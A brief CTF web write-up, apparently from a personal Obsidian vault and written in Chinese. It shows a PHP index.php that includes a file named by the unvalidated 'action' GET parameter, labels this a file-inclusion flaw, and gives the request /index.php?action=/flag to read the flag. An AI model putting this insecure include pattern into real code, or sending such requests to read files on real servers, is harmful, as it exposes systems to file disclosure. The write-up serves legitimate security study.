![[Pasted image 20230128143611.png|500]]

![[Pasted image 20230128144500.png|500]]

```php
<?php
$action = (isset($_GET['action']) ? $_GET['action'] : 'home.php');
if (file_exists($action)) {
	include $action;
} else {
	echo "File not found!";
}
?>
```

`index.php`中存在文件包含漏洞

```
/index.php?action=/flag
```

![[Pasted image 20230128144442.png|300]]

#Web #PHP #文件包含 